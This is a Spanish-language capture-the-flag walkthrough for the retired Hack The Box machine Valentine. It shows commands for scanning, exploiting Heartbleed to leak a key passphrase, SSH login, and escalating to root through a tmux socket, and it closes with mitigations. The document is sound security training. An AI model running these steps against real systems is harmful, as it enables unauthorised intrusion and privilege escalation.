---
machine: Valentine
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, heartbleed, cve-2014-0160, rsa-key, ssh, tmux, dirtycow]
---

# Valentine — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Coincidencia de dos pistas: en `/dev/` hay una **clave RSA privada cifrada** (en hexadecimal) y el 443 corre OpenSSL 1.0.1, vulnerable a **Heartbleed (CVE-2014-0160)**. La fuga de memoria devuelve la *passphrase* de la clave; con ella se descifra y se entra por SSH como `hype`. La escalada es un socket de **tmux** de root con permisos laxos: `tmux -S /.devs/dev_sess` y ya se es root (también valía DirtyCow, con ese kernel).

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
nmap -p443 --script ssl-heartbleed <IP>
```

```text
22/tcp  open  ssh    OpenSSH 5.9p1 Debian 5ubuntu1.10
80/tcp  open  http   Apache httpd 2.2.22 (Ubuntu)
443/tcp open  https  Apache httpd 2.2.22  → ssl-heartbleed: VULNERABLE
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt
curl http://<IP>/dev/
```

En `/dev/` aparecen `hype_key` y `notes.txt`. La web tiene además un codificador y un decodificador (`/encode.php`, `/decode.php`), que son la pista de que todo lo que se envía pasa por memoria.

## Acceso

1. **Heartbleed** contra el 443 con cualquier implementación pública (PoC en Python, `nmap --script ssl-heartbleed`, Metasploit):

```bash
python2 heartbleed.py <IP> -p 443 | tee leak.txt
strings leak.txt | grep -i 'heartbleed'
```

2. **Contraseña de la clave**: el volcado contiene un texto en base64 que decodificado es la *passphrase* (`heartbleedbelievethehype` en esta máquina). Se puede confirmar con el decodificador de la propia web.

3. **Descifrar la clave**: `hype_key` está en hexadecimal.

```bash
cat hype_key | xxd -r -p > hype_key.pem
openssl rsa -in hype_key.pem -out hype_key_dec.pem
```

4. **SSH como `hype`**: el servidor sólo acepta `ssh-rsa` antiguo.

```bash
ssh -i hype_key_dec.pem -o PubkeyAcceptedKeyTypes=+ssh-rsa hype@<IP>
```

## Escalada

```bash
cat ~/.bash_history
```

El historial muestra un socket de tmux propiedad de root:

```bash
ls -l /.devs/dev_sess
tmux -S /.devs/dev_sess
```

```text
root@Valentine:~#
```

## Tropiezos

- **`ssh-rsa` deprecado**: un cliente moderno rechaza la clave con «no mutual signature algorithm»; hay que reactivar el algoritmo antiguo.
- **Hex, no PEM**: `hype_key` no abre con `openssl` directamente, primero `xxd -r -p`.
- **Passphrase**: puede venir partida en varias fugas de Heartbleed; conviene repetir el ataque y filtrar por cadenas imprimibles.
- **DirtyCow**: el kernel es antiguo y el exploit también funciona, pero el socket de tmux es más directo y menos arriesgado.

## Lecciones

- Heartbleed no sólo filtra claves de sesión: cualquier secreto que haya pasado por el proceso TLS puede salir.
- Publicar una clave privada, aunque esté cifrada, reduce el problema a crackear la *passphrase*.
- Un socket de tmux con permisos de escritura para otros usuarios equivale a ser root.
- Mitigación: parchear OpenSSL, no servir material criptográfico desde el webroot, y proteger los sockets de sesión.
